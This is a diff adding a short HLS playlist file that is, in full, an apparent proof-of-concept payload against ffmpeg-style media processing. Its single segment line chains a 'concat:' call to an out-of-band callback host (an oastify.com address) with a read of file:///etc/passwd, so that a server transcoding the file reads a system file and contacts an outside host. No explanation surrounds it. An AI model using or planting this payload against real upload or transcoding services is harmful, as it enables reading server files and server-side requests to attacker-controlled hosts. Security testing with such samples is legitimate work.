@@ -1,0 +1,5 @@
+#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:10.0,
+concat:http://a3e0r7pz2ibtljpz1qmpcdh5lwrnfd32.oastify.com/poc.m3u8|file:///etc/passwd
+#EXT-X-ENDLIST
